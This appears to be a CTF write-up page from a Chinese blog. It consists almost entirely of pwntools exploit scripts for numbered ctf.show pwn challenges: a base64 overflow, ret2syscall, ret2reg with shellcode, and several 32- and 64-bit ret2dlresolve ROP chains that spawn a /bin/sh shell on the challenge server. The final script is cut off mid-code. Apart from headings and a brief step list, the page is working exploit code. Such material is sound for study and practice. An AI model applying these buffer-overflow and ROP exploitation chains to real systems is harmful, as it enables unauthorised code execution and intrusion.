<h2 id="76-base64解码"><a href="#76-base64解码" class="headerlink" title="76 base64解码"></a>76 base64解码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28175</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">input_addr = <span class="number">0x811EB40</span></span><br><span class="line">shell = <span class="number">0x8049284</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(shell)+p32(input_addr)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="78-ret2syscall-64"><a href="#78-ret2syscall-64" class="headerlink" title="78 ret2syscall(64)"></a>78 ret2syscall(64)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28283</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000046b9f8</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004016c3</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x00000000004377f9</span></span><br><span class="line">ret = <span class="number">0x000000000045bac5</span></span><br><span class="line">buf = <span class="number">0x6c2000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line"><span class="comment"># read(0,buf,0x10)</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0x10</span>)+p64(buf)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line"><span class="comment"># syscall(0,buf,0)</span></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x3b</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(buf)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="79-ret2reg-32位-call-rax或jmp-reg挟持走向"><a href="#79-ret2reg-32位-call-rax或jmp-reg挟持走向" class="headerlink" title="79 ret2reg(32位) call rax或jmp reg挟持走向"></a>79 ret2reg(32位) call rax或jmp reg挟持走向</h2><h4 id="栈可执行"><a href="#栈可执行" class="headerlink" title="栈可执行"></a>栈可执行</h4><ol>
<li>查看溢出函数返回时哪个寄存值指向溢出缓冲区空间</li>
<li>查找<code>call rax</code>或<code>jmp reg</code>指令，将<code>EIP</code>设置位该指令地址</li>
<li><code>reg</code>所指向的空间上注入<code>shellcode</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28148</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">call_eax = p32(<span class="number">0x080484a0</span>)</span><br><span class="line">payload = flat(shellcode,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x208</span>+<span class="number">0x4</span>-<span class="built_in">len</span>(shellcode)),call_eax)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="82-高级ROP-NO-RELRO（32）ret2dlresolve-（适用于无基地址泄露）"><a href="#82-高级ROP-NO-RELRO（32）ret2dlresolve-（适用于无基地址泄露）" class="headerlink" title="82 高级ROP NO_RELRO（32）ret2dlresolve （适用于无基地址泄露）"></a>82 高级ROP NO_RELRO（32）ret2dlresolve （适用于无基地址泄露）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28244</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;PWN!\n&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x8049804</span>+<span class="number">4</span>,<span class="number">4</span>)	<span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x80498E0</span>,<span class="built_in">len</span>((dynstr)))		<span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x80498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))		<span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x8048376</span>)	<span class="comment"># the second instruction of read@plt</span></span><br><span class="line"><span class="comment">#section</span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x80498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x80498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="83-Partial-RELRO-32-ret2dlresolve"><a href="#83-Partial-RELRO-32-ret2dlresolve" class="headerlink" title="83 Partial_RELRO(32)ret2dlresolve"></a>83 Partial_RELRO(32)ret2dlresolve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28179</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;PWN!\n&quot;</span>)</span><br><span class="line">payload = flat(&#123;<span class="number">0x70</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="84-NO-RELRO（64）ret2dlresolve"><a href="#84-NO-RELRO（64）ret2dlresolve" class="headerlink" title="84 NO_RELRO（64）ret2dlresolve"></a>84 NO_RELRO（64）ret2dlresolve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28159</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400750</span></span><br><span class="line">csu_end_addr = <span class="number">0x40076A</span></span><br><span class="line">leave_ret  =<span class="number">0x40063c</span></span><br><span class="line">poprbp_ret = <span class="number">0x400588</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;PWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack privot to bss segment, set rsp = new_stack</span></span><br><span class="line">stack_size = <span class="number">0x200</span> <span class="comment"># new stack size is 0x200</span></span><br><span class="line">new_stack = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x600988</span>+<span class="number">8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">b&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop.chain()))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">b&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(<span class="number">0x600B30</span>+<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x600B30</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(dynstr)))</span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">b&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(dynstr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,<span class="number">0x600B30</span>+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr),<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line">rop.raw(<span class="number">0x400607</span>)</span><br><span class="line">rop.raw(<span class="string">b&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x0000000000400771</span>) <span class="comment">#pop rsi; pop r15; ret;</span></span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0x0000000000400773</span>)</span><br><span class="line">rop.raw(<span class="number">0x600B30</span>+<span class="number">0x100</span>+<span class="built_in">len</span>(dynstr))</span><br><span class="line">rop.raw(<span class="number">0x400516</span>) <span class="comment"># the second instruction of read@plt</span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop.chain()))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="85-Parti-RELRO（64）ret2dlresolve"><a href="#85-Parti-RELRO（64）ret2dlresolve" class="headerlink" title="85 Parti_RELRO（64）ret2dlresolve"></a>85 Parti_RELRO（64）ret2dlresolve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28274</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf, store_addr, func_name, resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment"># reloc entry size</span></span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment"># symbol entry size</span></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)//<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line">    <span class="comment"># construct fake reloc</span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)//<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr,<span class="string">b&quot;system&quot;</span>,elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)+<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;\x00&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"></span><br><span class="line"><span 